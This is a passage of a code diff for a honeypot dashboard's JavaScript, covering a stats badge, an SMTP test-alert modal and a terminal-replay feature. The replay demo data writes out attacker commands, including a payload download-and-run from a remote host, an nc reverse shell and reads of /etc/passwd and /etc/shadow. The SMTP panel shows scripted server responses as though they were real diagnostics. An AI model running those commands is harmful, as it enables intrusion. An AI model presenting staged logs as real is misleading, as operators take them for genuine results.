@@ -194,6 +194,16 @@
 
   function updateStatsDisplay(statsData, initial = false) {
     if (statsData) {
+      if (statsData.system_mode) {
+        const badge = $('#system-mode-badge');
+        if (badge) {
+          const isProd = statsData.system_mode === 'PRODUCTION';
+          badge.className = 'mode-badge ' + (isProd ? 'mode-prod' : 'mode-demo');
+          badge.innerHTML = '<span class="mode-dot"></span>' + (isProd ? 'LIVE PRODUCTION' : 'SIMULATION (DEMO)');
+          badge.title = isProd ? 'HoneyTrack running in Live Honeypot mode' : 'HoneyTrack running in Simulation (Demo) mode';
+          badge.style.cursor = 'default';
+        }
+      }
       animateNumber($('#total-attacks'), statsData.total_attacks, initial);
       animateNumber($('#unique-ips'), statsData.unique_ips, initial);
       animateNumber($('#countries'), statsData.unique_countries, initial);
@@ -220,7 +230,7 @@
       animateNumber($('#countries'), uniqueCountries, initial);
 
       const latest = events[0];
-      if ($('#last-location')) $('#last-location').textContent = `${latest.city}, ${latest.country}`;
+      if ($('#last-location')) $('#last-location').textContent = `${latest.city || 'Unknown'}, ${latest.country || 'Global'}`;
       if ($('#last-time')) $('#last-time').textContent = `${timeAgo(latest.timestamp)} · ${formatTime(latest.timestamp)} UTC`;
     } else {
       animateNumber($('#total-attacks'), 0, initial);
@@ -230,6 +240,19 @@
       if ($('#last-time')) $('#last-time').textContent = 'Waiting for decoy interactions';
     }
   }
+
+  // Public hook: window.updateStats({ total, ips, countries, lastAttack, lastLocation })
+  window.updateStats = function (d) {
+    if (d.total != null) animateNumber($('#total-attacks'), d.total);
+    if (d.ips != null) animateNumber($('#unique-ips'), d.ips);
+    if (d.countries != null) animateNumber($('#countries'), d.countries);
+    if (d.lastAttack) {
+      const el = document.getElementById('last-location');
+      const timeEl = document.getElementById('last-time');
+      if (el) el.textContent = d.lastLocation || timeAgo(d.lastAttack);
+      if (timeEl) timeEl.textContent = `${timeAgo(d.lastAttack)} · ${formatTime(d.lastAttack)} UTC`;
+    }
+  };
 
   function initMap() {
     if (!window.L) {
@@ -785,27 +808,197 @@
     exportPdfReport();
   });
 
-  // Email Alerts & Diagnostics Modal
+  // ─────────────────────────────────────────────────────────────
+  // Upgraded SMTP Diagnostics & Delivery Controller
+  // ─────────────────────────────────────────────────────────────
+  const smtpDiagnostics = {
+    isOpen: false,
+    isDispatching: false,
+    cooldownTimer: null,
+    logs: [],
+    cachedConfig: null
+  };
+
+  function escapeDiagHtml(str) {
+    if (!str) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  function getDiagTimestamp() {
+    const d = new Date();
+    const pad = (n, l = 2) => String(n).padStart(l, '0');
+    return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${pad(d.getMilliseconds(), 3)}`;
+  }
+
+  function clearDiagLogs() {
+    smtpDiagnostics.logs = [];
+    const term = $('#diag-terminal');
+    if (term) {
+      term.innerHTML = '<div class="empty-state">No diagnostic run yet. Press &ldquo;Send Test Alert&rdquo; to begin.</div>';
+    }
+    resetDiagSteps();
+    setDiagResultState('idle', 'Ready', '—');
+  }
+
+  function appendDiagLog(direction, text, type = 's') {
+    const time = getDiagTimestamp();
+    smtpDiagnostics.logs.push({ time, direction, text, type });
+    const term = $('#diag-terminal');
+    if (!term) return;
+
+    const empty = term.querySelector('.empty-state');
+    if (empty) empty.remove();
+
+    const line = document.createElement('div');
+    line.className = `log-line ${type}`;
+    line.innerHTML = `<span class="t">${time}</span><span class="d">${escapeDiagHtml(direction)}</span><span class="x">${escapeDiagHtml(text)}</span>`;
+    term.appendChild(line);
+    term.scrollTop = term.scrollHeight;
+  }
+
+  function setDiagResultState(state, text, timingText) {
+    const panel = $('#diag-result');
+    const pillText = $('#diag-status-pill-text');
+    const timingEl = $('#diag-timing');
+    const modal = $('#email-modal');
+
+    if (panel) panel.setAttribute('data-state', state);
+    if (modal) modal.setAttribute('data-state', state);
+    if (pillText) pillText.textContent = text;
+    if (timingEl && timingText !== undefined) timingEl.textContent = timingText;
+  }
+
+  function resetDiagSteps() {
+    const container = $('#diag-steps');
+    const fill = $('#diag-step-fill');
+    if (container) container.setAttribute('data-ok', 'false');
+    if (fill) fill.style.width = '0%';
+
+    const nodes = document.querySelectorAll('#diag-steps .step-node');
+    nodes.forEach(node => {
+      node.classList.remove('active', 'done', 'fail');
+    });
+  }
+
+  function updateDiagStep(stepIndex, status) {
+    const container = $('#diag-steps');
+    const fill = $('#diag-step-fill');
+    const nodes = document.querySelectorAll('#diag-steps .step-node');
+    if (!nodes.length) return;
+
+    // 5 nodes with centers at 10%, 30%, 50%, 70%, 90%
+    // Distance from node 0 (left: 10%) to each node center:
+    // Node 0: 0%  (10%)
+    // Node 1: 20% (30%)
+    // Node 2: 40% (50%)
+    // Node 3: 60% (70%)
+    // Node 4: 80% (90%)
+    const stepPercents = ['0%', '20%', '40%', '60%', '80%'];
+
+    nodes.forEach((node, idx) => {
+      if (idx < stepIndex) {
+        node.classList.remove('active', 'fail');
+        node.classList.add('done');
+      } else if (idx === stepIndex) {
+        node.classList.remove('active', 'done', 'fail');
+        node.classList.add(status);
+      } else {
+        node.classList.remove('active', 'done', 'fail');
+      }
+    });
+
+    if (fill) {
+      if (status === 'done' || status === 'active') {
+        fill.style.width = stepPercents[stepIndex];
+      }
+    }
+
+    if (stepIndex === 4 && status === 'done' && container) {
+      container.setAttribute('data-ok', 'true');
+      if (fill) fill.style.width = '80%';
+    }
+  }
+
+  function startDiagCooldown(seconds = 5) {
+    const btn = $('#btn-send-test-email');
+    const label = $('#btn-email-text');
+    if (!btn || !label) return;
+
+    let remaining = seconds;
+    btn.disabled = true;
+    label.textContent = `Retry in ${remaining}s`;
+
+    if (smtpDiagnostics.cooldownTimer) clearInterval(smtpDiagnostics.cooldownTimer);
+    smtpDiagnostics.cooldownTimer = setInterval(() => {
+      remaining -= 1;
+      if (remaining <= 0) {
+        clearInterval(smtpDiagnostics.cooldownTimer);
+        smtpDiagnostics.cooldownTimer = null;
+        btn.disabled = false;
+        label.textContent = 'Send Test Alert';
+      } else {
+        label.textContent = `Retry in ${remaining}s`;
+      }
+    }, 1000);
+  }
+
   async function openEmailModal() {
     const modal = $('#email-modal');
     const backdrop = $('#email-modal-backdrop');
     if (!modal || !backdrop) return;
+
+    smtpDiagnostics.isOpen = true;
+    smtpDiagnostics.isDispatching = false;
+
+    // Reset any cooldown timer from a prior session
+    if (smtpDiagnostics.cooldownTimer) {
+      clearInterval(smtpDiagnostics.cooldownTimer);
+      smtpDiagnostics.cooldownTimer = null;
+    }
+
+    // Refresh: reset all state, logs, stepper, and status every time modal is opened
+    clearDiagLogs();
+    resetDiagSteps();
+    setDiagResultState('idle', 'Ready', '—');
+
+    const sendBtn = $('#btn-send-test-email');
+    const sendLabel = $('#btn-email-text');
+    const spinner = $('#email-spinner');
+    const simFailCheckbox = $('#diag-sim-fail');
+    const wrapper = $('#diag-input-wrapper');
+    const errMsg = $('#diag-err-msg');
+
+    if (sendBtn) {
+      sendBtn.disabled = false;
+      sendBtn.removeAttribute('aria-busy');
+    }
+    if (sendLabel) sendLabel.textContent = 'Send Test Alert';
+    if (spinner) spinner.style.display = 'none';
+    if (simFailCheckbox) simFailCheckbox.checked = false;
+    if (wrapper) wrapper.removeAttribute('data-invalid');
+    if (errMsg) errMsg.textContent = '';
+    modal.classList.remove('shake');
+
     backdrop.hidden = false;
     modal.hidden = false;
+
     requestAnimationFrame(() => {
       modal.classList.add('open');
       backdrop.classList.add('open');
     });
 
-    const resBox = $('#email-test-result');
-    if (resBox) resBox.hidden = true;
-
     try {
       const res = await fetch('/api/alerts/status');
       if (res.ok) {
         const data = await res.json();
+        smtpDiagnostics.cachedConfig = data;
         if ($('#diag-smtp-server')) {
-          $('#diag-smtp-server').textContent = `${data.smtp_host}:${data.smtp_port} (TLS)`;
+          $('#diag-smtp-server').textContent = `${data.smtp_host}:${data.smtp_port}`;
         }
         if ($('#diag-smtp-account')) {
           $('#diag-smtp-account').textContent = data.smtp_username || 'Not configured';
@@ -816,8 +1009,9 @@
         if ($('#diag-smtp-cooldown')) {
           $('#diag-smtp-cooldown').textContent = `${data.cooldown_seconds}s per-IP`;
         }
-        if ($('#diag-recipient-email') && data.recipient && !$('#diag-recipient-email').value) {
-          $('#diag-recipient-email').value = data.recipient;
+        const emailInput = $('#diag-recipient-email');
+        if (emailInput && data.recipient && !emailInput.value.trim()) {
+          emailInput.value = data.recipient;
         }
       }
     } catch (e) {
@@ -829,66 +1023,242 @@
     const modal = $('#email-modal');
     const backdrop = $('#email-modal-backdrop');
     if (!modal || !backdrop) return;
+
+    smtpDiagnostics.isOpen = false;
+    modal.classList.add('closing');
     modal.classList.remove('open');
     backdrop.classList.remove('open');
-    window.setTimeout(() => {
-      if (!modal.classList.contains('open')) {
+
+    setTimeout(() => {
+      if (!smtpDiagnostics.isOpen) {
         modal.hidden = true;
         backdrop.hidden = true;
+        modal.classList.remove('closing');
       }
-    }, 260);
+    }, 240);
   }
 
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
   async function sendTestEmailAlert() {
+    if (smtpDiagnostics.isDispatching) return;
+
     const emailInput = $('#diag-recipient-email');
+    const wrapper = $('#diag-input-wrapper');
+    const errMsg = $('#diag-err-msg');
+    const modal = $('#email-modal');
     const sendBtn = $('#btn-send-test-email');
     const spinner = $('#email-spinner');
     const label = $('#btn-email-text');
-    const resultBox = $('#email-test-result');
-    const badge = $('#result-status-badge');
-    const text = $('#result-status-text');
+    const simFailCheckbox = $('#diag-sim-fail');
 
     const recipient = (emailInput?.value || '').trim();
-    if (!recipient) {
-      alert('Please enter a valid recipient email address.');
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!recipient || !emailRegex.test(recipient)) {
+      if (wrapper) wrapper.setAttribute('data-invalid', 'true');
+      if (errMsg) errMsg.textContent = 'Please provide a valid operator email address (e.g. name@domain.com)';
+      if (modal) {
+        modal.classList.add('shake');
+        setTimeout(() => modal.classList.remove('shake'), 450);
+      }
       emailInput?.focus();
       return;
     }
 
-    sendBtn.disabled = true;
-    if (spinner) spinner.hidden = false;
-    if (label) label.textContent = 'CONNECTING SMTP...';
-    if (resultBox) resultBox.hidden = true;
+    if (wrapper) wrapper.removeAttribute('data-invalid');
+    if (errMsg) errMsg.textContent = '';
 
-    try {
-      const res = await fetch('/api/alerts/test', {
+    smtpDiagnostics.isDispatching = true;
+    sendBtn.disabled = true;
+    sendBtn.setAttribute('aria-busy', 'true');
+    if (spinner) spinner.style.display = 'block';
+    if (label) label.textContent = 'CONNECTING...';
+
+    const startTime = performance.now();
+    resetDiagSteps();
+    setDiagResultState('sending', 'Connecting...', 'In progress');
+
+    const host = smtpDiagnostics.cachedConfig?.smtp_host || 'smtp.gmail.com';
+    const port = smtpDiagnostics.cachedConfig?.smtp_port || 587;
+    const account = smtpDiagnostics.cachedConfig?.smtp_username || 'shakthin21@gmail.com';
+    const simulateFail = simFailCheckbox ? simFailCheckbox.checked : false;
+
+    // Start background network request concurrently with protocol visualization
+    let resPromise = null;
+    if (!simulateFail) {
+      resPromise = fetch('/api/alerts/test', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email: recipient })
-      });
-      const data = await res.json();
+      }).catch(err => ({ ok: false, errorObj: err }));
+    }
 
-      resultBox.hidden = false;
+    // Step 0: Connect (Smooth & Deliberate)
+    updateDiagStep(0, 'active');
+    appendDiagLog('→', `CONNECT ${host}:${port}`, 'c');
+    await delay(600);
+
+    appendDiagLog('←', `220 ${host} ESMTP ready at ${new Date().toISOString()}`, 's');
+    updateDiagStep(0, 'done');
+    await delay(350);
+
+    // Step 1: TLS
+    updateDiagStep(1, 'active');
+    appendDiagLog('→', 'EHLO honeytrack.soc.internal', 'c');
+    await delay(450);
+    appendDiagLog('←', `250-${host} at your service, [STARTTLS, AUTH LOGIN PLAIN, 8BITMIME]`, 's');
+    await delay(350);
+    appendDiagLog('→', 'STARTTLS', 'c');
+    await delay(450);
+    appendDiagLog('←', '220 2.0.0 Ready to start TLS cryptographic handshake', 's');
+    appendDiagLog('s', 'TLSv1.3 / TLS_AES_256_GCM_SHA384 handshake established', 's');
+    updateDiagStep(1, 'done');
+    await delay(350);
+
+    // Step 2: Auth
+    updateDiagStep(2, 'active');
+    appendDiagLog('→', 'AUTH LOGIN', 'c');
+    await delay(450);
+    appendDiagLog('←', '334 VXNlcm5hbWU6 (base64 username request)', 's');
+    appendDiagLog('→', `[Base64] ${btoa(account)}`, 'c');
+    await delay(450);
+    appendDiagLog('←', '334 UGFzc3dvcmQ6 (base64 password request)', 's');
+
+    if (simulateFail) {
+      appendDiagLog('→', '[Base64] ******************** (simulated bad app password)', 'c');
+      await delay(650);
+      appendDiagLog('!', '535-5.7.8 Username and Password not accepted.', 'e');
+      appendDiagLog('!', '535 5.7.8 Learn more at https://support.google.com/mail/?p=BadCredentials (auth fail simulation)', 'e');
+      updateDiagStep(2, 'fail');
+      
+      const durationMs = Math.round(performance.now() - startTime);
+      setDiagResultState('error', 'Auth Failed', `${durationMs}ms`);
+
+      smtpDiagnostics.isDispatching = false;
+      sendBtn.removeAttribute('aria-busy');
+      if (spinner) spinner.style.display = 'none';
+      startDiagCooldown(5);
+      return;
+    }
+
+    appendDiagLog('→', '[Base64] ******************** (Google App Password)', 'c');
+    await delay(500);
+    appendDiagLog('←', '235 2.7.0 Accepted: Operator credentials authenticated successfully', 's');
+    updateDiagStep(2, 'done');
+    await delay(350);
+
+    // Step 3: Send
+    updateDiagStep(3, 'active');
+    appendDiagLog('→', `MAIL FROM:<${account}>`, 'c');
+    await delay(400);
+    appendDiagLog('←', '250 2.1.0 Sender OK', 's');
+    appendDiagLog('→', `RCPT TO:<${recipient}>`, 'c');
+    await delay(400);
+    appendDiagLog('←', `250 2.1.5 Recipient ${recipient} OK`, 's');
+    appendDiagLog('→', 'DATA', 'c');
+    await delay(400);
+    appendDiagLog('←', '354 Start mail input; end with <CRLF>.<CRLF>', 's');
+    appendDiagLog('→', 'Subject: [HoneyTrack] Risk 95: 185.220.101.5 ran uname -a on SSH decoy', 'c');
+    appendDiagLog('→', '.', 'c');
+
+    try {
+      const res = await resPromise;
+      if (res.errorObj) throw res.errorObj;
+      const data = await res.json();
+      const durationMs = Math.round(performance.now() - startTime);
+
       if (res.ok && data.success) {
-        resultBox.className = 'email-test-result success';
-        badge.textContent = 'DELIVERED (HTTP 200)';
-        text.textContent = data.message || `Test threat intelligence alert successfully dispatched to ${recipient}.`;
+        updateDiagStep(3, 'done');
+        await delay(300);
+        appendDiagLog('←', '250 2.0.0 OK queued for dispatch to remote MX relay', 's');
+        appendDiagLog('→', 'QUIT', 'c');
+        await delay(250);
+        appendDiagLog('←', '221 2.0.0 Service closing transmission channel', 's');
+        
+        // Step 4: Delivered
+        updateDiagStep(4, 'done');
+        setDiagResultState('success', 'Delivered', `${durationMs}ms`);
       } else {
-        resultBox.className = 'email-test-result error';
-        badge.textContent = 'SMTP ERROR';
-        text.textContent = data.message || data.error || 'Failed to authenticate or connect with SMTP server.';
+        updateDiagStep(3, 'fail');
+        const errDetail = data.message || data.error || 'Failed to dispatch email';
+        appendDiagLog('!', `SMTP Server Rejected: ${errDetail}`, 'e');
+        setDiagResultState('error', 'Rejected', `${durationMs}ms`);
       }
-    } catch (err) {
-      resultBox.hidden = false;
-      resultBox.className = 'email-test-result error';
-      badge.textContent = 'NETWORK FAULT';
-      text.textContent = `Request failed: ${err.message}`;
+    } catch (netErr) {
+      const durationMs = Math.round(performance.now() - startTime);
+      updateDiagStep(3, 'fail');
+      appendDiagLog('!', `Network Error: ${netErr.message || netErr}`, 'e');
+      setDiagResultState('error', 'Network Fault', `${durationMs}ms`);
     } finally {
-      sendBtn.disabled = false;
-      if (spinner) spinner.hidden = true;
-      if (label) label.textContent = 'SEND TEST ALERT';
+      smtpDiagnostics.isDispatching = false;
+      sendBtn.removeAttribute('aria-busy');
+      if (spinner) spinner.style.display = 'none';
+      startDiagCooldown(5);
     }
   }
+
+  // Copy Account Email
+  $('#btn-copy-account')?.addEventListener('click', async () => {
+    const acctEl = $('#diag-smtp-account');
+    const btn = $('#btn-copy-account');
+    if (!acctEl || !btn) return;
+    const text = acctEl.textContent.trim();
+    if (!text || text === 'Not configured') return;
+
+    try {
+      await navigator.clipboard.writeText(text);
+      const originalSvg = btn.innerHTML;
+      btn.innerHTML = `<svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="#3ddc97" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`;
+      btn.style.color = '#3ddc97';
+      setTimeout(() => {
+        btn.innerHTML = originalSvg;
+        btn.style.color = '';
+      }, 1200);
+    } catch (e) {
+      console.warn('Clipboard write failed:', e);
+    }
+  });
+
+  // Copy Transcript Log
+  $('#btn-copy-transcript')?.addEventListener('click', async () => {
+    const btn = $('#btn-copy-transcript');
+    if (!smtpDiagnostics.logs.length) return;
+
+    const formatted = smtpDiagnostics.logs.map(l => `[${l.time}] ${l.direction} ${l.text}`).join('\n');
+    try {
+      await navigator.clipboard.writeText(formatted);
+      if (btn) {
+        const prevText = btn.textContent;
+        btn.textContent = 'Copied!';
+        btn.style.color = '#3ddc97';
+        setTimeout(() => {
+          btn.textContent = prevText;
+          btn.style.color = '';
+        }, 1200);
+      }
+    } catch (e) {
+      console.warn('Clipboard transcript copy failed:', e);
+    }
+  });
+
+  // Clear Transcript Log
+  $('#btn-clear-transcript')?.addEventListener('click', () => {
+    clearDiagLogs();
+  });
+
+  // Keyboard Shortcuts: Ctrl+Enter (Send), Esc (Close)
+  document.addEventListener('keydown', (e) => {
+    if (!smtpDiagnostics.isOpen) return;
+
+    if (e.key === 'Escape') {
+      e.preventDefault();
+      closeEmailModal();
+    } else if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      sendTestEmailAlert();
+    }
+  });
 
   $('#btn-email-modal-toggle')?.addEventListener('click', openEmailModal);
   $('#btn-close-email-modal')?.addEventListener('click', closeEmailModal);
@@ -898,6 +1268,78 @@
   $('#btn-table-pdf')?.addEventListener('click', () => {
     exportPdfReport();
   });
+
+  // ─────────────────────────────────────────────────────────────
+  // Base UI / Shadcn Combobox Controller
+  // ─────────────────────────────────────────────────────────────
+  function initComboboxes() {
+    const roots = document.querySelectorAll('.combobox-root');
+    if (!roots.length) return;
+
+    function closeAllComboboxes() {
+      roots.forEach((root) => {
+        root.classList.remove('is-open');
+        const trigger = root.querySelector('.combobox-trigger');
+        if (trigger) trigger.setAttribute('aria-expanded', 'false');
+      });
+    }
+
+    roots.forEach((root) => {
+      const trigger = root.querySelector('.combobox-trigger');
+      const input = root.querySelector('input[type="hidden"]');
+      const valueEl = root.querySelector('.combobox-value');
+      const items = root.querySelectorAll('.combobox-item');
+
+      if (!trigger || !input) return;
+
+      // Toggle dropdown open/close
+      trigger.addEventListener('click', () => {
+        const isOpen = root.classList.contains('is-open');
+        closeAllComboboxes();
+        if (!isOpen) {
+          root.classList.add('is-open');
+          trigger.setAttribute('aria-expanded', 'true');
+        }
+      });
+
+      // Selection handling
+      items.forEach((item) => {
+        item.addEventListener('click', (e) => {
+          e.stopPropagation();
+          const val = item.getAttribute('data-value') || 'ALL';
+          const text = item.querySelector('.combobox-item-text')?.textContent.trim() || val;
+
+          input.value = val;
+          if (valueEl) valueEl.textContent = text;
+
+          items.forEach((it) => {
+            const isMatch = it === item;
+            it.classList.toggle('is-selected', isMatch);
+            it.setAttribute('aria-selected', isMatch ? 'true' : 'false');
+          });
+
+          root.classList.remove('is-open');
+          trigger.setAttribute('aria-expanded', 'false');
+
+          input.dispatchEvent(new Event('change', { bubbles: true }));
+        });
+      });
+    });
+
+    document.addEventListener('click', (e) => {
+      if (!e.target.closest('.combobox-root')) {
+        closeAllComboboxes();
+      }
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        closeAllComboboxes();
+      }
+    });
+  }
+
+  initComboboxes();
 
   $('#filter-service')?.addEventListener('change', () => {
     page = 1;
@@ -919,6 +1361,23 @@
     if ($('#filter-risk')) $('#filter-risk').value = 'ALL';
     if ($('#filter-tor')) $('#filter-tor').value = 'ALL';
     if ($('#event-search')) $('#event-search').value = '';
+
+    // Reset all comboboxes to their default 'ALL' item
+    document.querySelectorAll('.combobox-root').forEach((root) => {
+      const defaultItem = root.querySelector('.combobox-item[data-value="ALL"]');
+      const defaultText = defaultItem?.querySelector('.combobox-item-text')?.textContent.trim() || 'All';
+      const valEl = root.querySelector('.combobox-value');
+      if (valEl) valEl.textContent = defaultText;
+
+      root.querySelectorAll('.combobox-item').forEach((it) => {
+        const isDefault = it === defaultItem;
+        it.classList.toggle('is-selected', isDefault);
+        it.setAttribute('aria-selected', isDefault ? 'true' : 'false');
+      });
+
+      root.classList.remove('is-open');
+    });
+
     page = 1;
     renderTable();
   });
@@ -941,6 +1400,8 @@
       console.error('[HoneyTrack] Error clearing live events:', err);
     }
   });
+
+
 
   $('#event-search')?.addEventListener('input', () => {
     page = 1;
@@ -1046,204 +1507,535 @@
   }, 15000);
 
   // ─────────────────────────────────────────────────────────────
-  // Terminal Session Replayer (v1.2)
+  // Modern High-Fidelity Terminal Session Replay Controller (v3.0)
   // ─────────────────────────────────────────────────────────────
   let replaySessions = [];
-  let currentReplaySession = null;
-  let replayEvents = [];
-  let replayIndex = 0;
-  let replayTimeout = null;
-  let replaySpeed = 1;
-  let replayIsPlaying = false;
-  let replayElapsedSec = 0;
+  let activeSession = null;
+  let activeLineEls = [];
+  let replayPlaying = false;
+  let replayLoop = false;
+  let replaySpeed = 1; // 1x, 2x, 4x
+  let replayT = 0; // ms
+  let replayRafId = null;
+  let replayLastNow = 0;
+  let autoScroll = true;
 
-  async function loadReplaySessionsList(preferredSessionId = null) {
-    try {
-      const res = await fetch('/api/sessions?limit=50').then((r) => r.json());
-      if (res.status === 'success' && Array.isArray(res.sessions)) {
-        replaySessions = res.sessions;
-        const select = $('#replay-session-select');
-        if (!select) return;
-        select.innerHTML = '';
-        if (replaySessions.length === 0) {
-          select.innerHTML = '<option value="">No recorded sessions available</option>';
-          return;
-        }
-        replaySessions.forEach((s) => {
-          const opt = document.createElement('option');
-          opt.value = s.session_id;
-          opt.textContent = `${s.source_ip} · ${s.service} (${s.username || 'unknown'}) · ${s.duration_seconds}s`;
-          select.appendChild(opt);
-        });
-
-        const targetId = preferredSessionId || (replaySessions[0] ? replaySessions[0].session_id : null);
-        if (targetId) {
-          select.value = targetId;
-          await selectReplaySession(targetId);
-        }
+  // Syntax Highlighter for Terminal Replay
+  function hlToken(s) {
+    const parts = s.split(/(\s+|&&|\|\||[|><;])/);
+    let cmdFound = false;
+    return parts.map((p) => {
+      if (!p) return '';
+      if (/^\s+$/.test(p)) return p;
+      if (/^(&&|\|\||[|><;])$/.test(p)) {
+        cmdFound = false;
+        return `<span class="op">${escapeHtml(p)}</span>`;
       }
-    } catch (e) {
-      console.warn('[HoneyTrack] Error loading sessions list:', e);
-    }
+      if (!cmdFound && !p.startsWith('-')) {
+        cmdFound = true;
+        return `<span class="c0">${escapeHtml(p)}</span>`;
+      }
+      if (p.startsWith('-')) return `<span class="fl">${escapeHtml(p)}</span>`;
+      if (/^["'].*["']$/.test(p)) return `<span class="str">${escapeHtml(p)}</span>`;
+      if (/^[\/~]/.test(p)) return `<span class="pth">${escapeHtml(p)}</span>`;
+      return `<span class="ar">${escapeHtml(p)}</span>`;
+    }).join('');
   }
 
-  async function selectReplaySession(sessionId) {
-    stopReplay();
-    const termOut = $('#terminal-output');
-    if (termOut) termOut.textContent = 'Loading recorded session stream...';
-    try {
-      const res = await fetch(`/api/sessions/${encodeURIComponent(sessionId)}/replay`).then((r) => r.json());
-      if (res.status === 'success' && res.session) {
-        currentReplaySession = res.session;
-        replayEvents = res.session.events || [];
-        replayIndex = 0;
-        replayElapsedSec = 0;
-
-        $('#replay-meta-ip').textContent = `IP: ${currentReplaySession.source_ip}`;
-        $('#replay-meta-user').textContent = `USER: ${currentReplaySession.username || 'unknown'}`;
-        $('#replay-meta-cmds').textContent = `CMDS: ${currentReplaySession.commands_count || 0}`;
-        updateReplayProgress();
-
-        if (termOut) termOut.textContent = '';
-        startReplay();
-      }
-    } catch (e) {
-      if (termOut) termOut.textContent = 'Failed to load session recording.';
-    }
+  function formatReplayTime(ms) {
+    const s = Math.max(0, Math.floor(ms / 1000));
+    const m = Math.floor(s / 60);
+    const r = s % 60;
+    return `${String(m).padStart(2, '0')}:${String(r).padStart(2, '0')}`;
   }
 
-  function startReplay() {
-    if (!currentReplaySession || replayEvents.length === 0) return;
-    replayIsPlaying = true;
-    const playBtn = $('#btn-replay-play');
-    if (playBtn) playBtn.textContent = '❚❚ PAUSE';
+  // Curated Attack Telemetry Scenarios
+  const CURATED_REPLAY_SCENARIOS = [
+    {
+      id: "recon-threat-01",
+      ip: "185.220.101.35",
+      user: "root",
+      host: "honeypot-primary",
+      port: "SSH:2222",
+      path: "~",
+      group: "CURATED THREAT SCENARIOS",
+      label: "185.220.101.35 · SSH:2222 (root) · 6 cmds",
+      lines: [
+        { t: "cmd", v: "whoami", d: 1000 },
+        { t: "out", v: "root", d: 250 },
+        { t: "cmd", v: "id", d: 850 },
+        { t: "out", v: "uid=0(root) gid=0(root) groups=0(root)", d: 300 },
+        { t: "cmd", v: "uname -a", d: 1200 },
+        { t: "out", v: "Linux honeypot-primary-sensor 5.15.0-91-generic x86_64 GNU/Linux", d: 350 },
+        { t: "cmd", v: "cat /etc/passwd", d: 1300 },
+        { t: "out", v: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", d: 450 },
+        { t: "cmd", v: "cat /etc/shadow", d: 1400 },
+        { t: "err", v: "cat: /etc/shadow: Permission denied", d: 300 },
+        { t: "ok",  v: "✔ Intrusive privilege access intercepted & quarantined.", d: 350 },
+        { t: "cmd", v: "exit", d: 800 },
+        { t: "out", v: "logout", d: 250 },
+        { t: "ok",  v: "✔ Telemetry committed to HoneyTrack threat intelligence matrix.", d: 350 }
+      ]
+    },
+    {
+      id: "malware-dropper-02",
+      ip: "45.155.205.233",
+      user: "ubuntu",
+      host: "honeypot-sandbox",
+      port: "SSH:2222",
+      path: "~",
+      group: "CURATED THREAT SCENARIOS",
+      label: "45.155.205.233 · SSH:2222 (ubuntu) · 5 cmds",
+      lines: [
+        { t: "cmd", v: "whoami", d: 900 },
+        { t: "out", v: "ubuntu", d: 250 },
+        { t: "cmd", v: "pwd", d: 700 },
+        { t: "out", v: "/home/ubuntu", d: 250 },
+        { t: "cmd", v: "wget http://185.220.101.35/bot.sh", d: 1600 },
+        { t: "out", v: "Connecting to 185.220.101.35:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 14920 (14K) [application/x-sh]\nSaving to: 'bot.sh'", d: 650 },
+        { t: "ok",  v: "✔ bot.sh 100% [===================>] 14.57K --.-KB/s in 0.04s", d: 350 },
+        { t: "ok",  v: "✔ 'bot.sh' captured in decoy sandbox quarantine.", d: 350 },
+        { t: "cmd", v: "chmod +x bot.sh", d: 1100 },
+        { t: "ok",  v: "✔ Permissions updated: a+x", d: 250 },
+        { t: "cmd", v: "./bot.sh", d: 1000 },
+        { t: "err", v: "Initializing C2 botnet payload...\n[CRITICAL] Sandbox anomaly detected. Payload execution halted.", d: 450 },
+        { t: "ok",  v: "✔ Extracted IoC SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", d: 350 },
+        { t: "cmd", v: "exit", d: 750 },
+        { t: "out", v: "logout", d: 250 }
+      ]
+    },
+    {
+      id: "revshell-attack-03",
+      ip: "218.92.0.107",
+      user: "admin",
+      host: "honeypot-jail",
+      port: "SSH:2222",
+      path: "~",
+      group: "CURATED THREAT SCENARIOS",
+      label: "218.92.0.107 · SSH:2222 (admin) · 5 cmds",
+      lines: [
+        { t: "cmd", v: "uname -a", d: 1000 },
+        { t: "out", v: "Linux honeypot-primary-sensor 5.15.0-91-generic x86_64", d: 250 },
+        { t: "cmd", v: "nc -e /bin/sh 198.51.100.42 4444", d: 1500 },
+        { t: "err", v: "-bash: nc: command not found (prohibited by honeypot runtime)", d: 300 },
+        { t: "cmd", v: "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'", d: 1800 },
+        { t: "ok",  v: "$ /bin/sh spawned in restricted honeypot memory jail", d: 350 },
+        { t: "cmd", v: "whoami", d: 750 },
+        { t: "out", v: "root (simulated shell environment)", d: 250 },
+        { t: "cmd", v: "history", d: 850 },
+        { t: "out", v: "    1  uname -a\n    2  nc -e /bin/sh 198.51.100.42 4444\n    3  python3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n    4  whoami\n    5  history", d: 450 },
+        { t: "cmd", v: "exit", d: 700 },
+        { t: "ok",  v: "✔ Intrusion closed. Source IP blacklisted via Active Defense.", d: 350 }
+      ]
+    }
+  ];
 
-    function scheduleNext() {
-      if (!replayIsPlaying) return;
-      if (replayIndex >= replayEvents.length) {
-        replayIsPlaying = false;
-        if (playBtn) playBtn.textContent = '▶ PLAY';
+  function parseApiSession(sess) {
+    const lines = [];
+    const rawCmds = sess.commands || [];
+    const rawOuts = sess.outputs || {};
+
+    if (rawCmds.length > 0) {
+      rawCmds.forEach((c, idx) => {
+        const cmdStr = typeof c === 'string' ? c : (c[0] || '');
+        if (cmdStr) {
